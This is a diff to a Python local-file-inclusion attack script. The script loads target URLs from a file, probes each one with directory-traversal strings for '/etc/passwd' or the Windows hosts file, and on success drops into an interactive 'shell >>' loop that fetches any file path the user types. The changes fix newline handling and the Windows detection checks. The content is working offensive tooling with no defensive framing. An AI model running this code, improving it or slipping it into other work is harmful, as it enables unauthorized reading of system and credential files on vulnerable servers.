@@ -19,7 +19,7 @@ def linux_lfi():
 				while True:
 					if "root:x" in r:
 						i = input("shell >> ")
-						r = requests.get(url+i)
+						r = requests.get(url.strip('\n')+i)
 						r = r.text
 						print(r)
 
@@ -42,13 +42,7 @@ def linux_dirtrav():
                         i = input("shell >> ")
                         r = requests.get(url.strip('\n') + dirtrav + i)
                         r = r.text
-                        result = re.findall(r'<br>(.*)</html>', r, re.DOTALL)[-1]
-                        res = result.split('\n')
-                        for line in res:
-                            if "<br><br><br>" not in line:
-                                print(line)
-                            else:
-                                pass
+                        print(r)
             else:
                 print("no linux lfi present using directory traversal")
                 
@@ -57,19 +51,19 @@ linux_dirtrav()
 
 
 def windows_lfi():
-	# do a windows lfi check using /etc/passwd file
+	# do a windows lfi check using windows hosts file
 	with open('lfi-test_urls','r')as lfi:
 		for url in lfi:
-			url = url.strip()+win
+			url = url.strip('\n')+win
 			r = requests.get(url)
 			r = r.text
 			if "This is a sample HOSTS file" in r:
 				print("lfi present in "+url)
 				print("starting a shell")
 				while True:
-					if "root:x" in r:
+					if "This is a sample HOSTS file" in r:
 						i = input("shell >> ")
-						r = requests.get(url+i)
+						r = requests.get(url.strip('\n')+i)
 						r = r.text
 						print(r)
 			else:
@@ -86,9 +80,9 @@ def windows_dirtrav():
 				print("lfi present in "+url)
 				print("starting a shell")
 				while True:
-					if "root:x" in r:
+					if "This is a sample HOSTS file" in r:
 						i = input("shell >> ")
-						r = requests.get(url+i)
+						r = requests.get(url.strip('\n')+i)
 						r = r.text
 						print(r)
 			else:
